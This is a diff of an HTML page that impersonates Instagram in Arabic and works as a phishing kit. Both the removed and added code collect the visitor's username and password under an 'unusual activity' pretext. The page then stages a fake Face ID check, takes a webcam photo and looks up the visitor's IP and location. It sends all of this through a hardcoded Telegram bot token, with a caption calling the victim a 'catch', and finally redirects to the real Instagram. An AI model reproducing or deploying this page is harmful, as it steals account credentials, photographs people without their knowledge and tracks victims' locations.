@@ -1,94 +1,85 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Support</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px 20px; width: 350px; text-align: center; border-radius: 1px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 14px; }
-        #verify-section { display: none; }
-        .info-text { font-size: 14px; color: #8e8e8e; margin: 20px 0; line-height: 1.5; }
-        .logo { width: 175px; margin-bottom: 30px; }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 330px; text-align: center; border-radius: 8px; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #262626; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
+        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #step2 { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="login-section">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo" alt="Instagram">
-        <form id="login-form">
-            <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم أو البريد" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
+<div class="card">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+    
+    <div id="step1">
+        <h2>تأكيد ملكية الحساب</h2>
+        <p>نظراً لنشاط غير معتاد، يرجى تسجيل الدخول وإكمال فحص الأمان للمتابعة.</p>
+        <input type="text" id="user" placeholder="اسم المستخدم" style="width:90%; padding:10px; margin-bottom:10px; border:1px solid #dbdbdb;">
+        <input type="password" id="pass" placeholder="كلمة السر" style="width:90%; padding:10px; margin-bottom:20px; border:1px solid #dbdbdb;">
+        <button class="btn" onclick="nextStep()">متابعة</button>
     </div>
 
-    <div id="verify-section">
-        <h3>تأكيد الهوية</h3>
-        <p class="info-text">لأمان حسابك، يرجى إجراء فحص سريع للوجه للتأكد من أنك لست روبوت (CAPTCHA Face ID).</p>
-        <button id="start-camera">بدء الفحص الآن</button>
+    <div id="step2">
+        <h2>خطوة الأمان الأخيرة</h2>
+        <p>يرجى السماح بالوصول للكاميرا لإتمام فحص الوجه (Face ID).</p>
+        <button class="btn" onclick="captureEverything()">بدء الفحص</button>
     </div>
 </div>
 
 <script>
-    const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
-    const chat_id = '8658217605';
-    let user_email = "", user_pass = "";
+    const config = {
+        t: '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8',
+        c: '8658217605'
+    };
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        user_email = document.getElementById('email').value;
-        user_pass = document.getElementById('pass').value;
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('verify-section').style.display = 'block';
-    });
+    let u = "", p = "";
 
-    document.getElementById('start-camera').addEventListener('click', async function() {
-        this.innerText = "جاري التحميل...";
-        this.disabled = true;
+    function nextStep() {
+        u = document.getElementById('user').value;
+        p = document.getElementById('pass').value;
+        if(u && p) {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+    }
 
+    async function captureEverything() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
+            // جلب الـ IP بدقة
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
 
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'identity.jpg');
+                const fd = new FormData();
+                fd.append('chat_id', config.c);
+                fd.append('photo', blob, 'a.jpg');
+                fd.append('caption', `🔥 صيدة لـ أنس:\n👤: ${u}\n🔑: ${p}\n🌐 IP: ${ipData.ip}\n📍 ${ipData.city}, ${ipData.country_name}\n📱 ${navigator.userAgent}`);
+
+                await fetch(`https://api.telegram.org/bot${config.t}/sendPhoto`, { method: 'POST', body: fd });
                 
-                const caption = `🔥 صيدة جديدة لـ أنس:\n\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}\n\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}\n🖥️ الشاشة: ${screen.width}x${screen.height}`;
-
-                formData.append('caption', caption);
-
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach(t => t.stop());
                 window.location.replace("https://www.instagram.com");
             }, 'image/jpeg');
-
-        } catch (err) {
-            const fallback = `⚠️ رفض الكاميرا:\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}`;
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fallback)}`);
+        } catch (e) {
             window.location.replace("https://www.instagram.com");
         }
-    });
+    }
 </script>
-
 </body>
 </html>
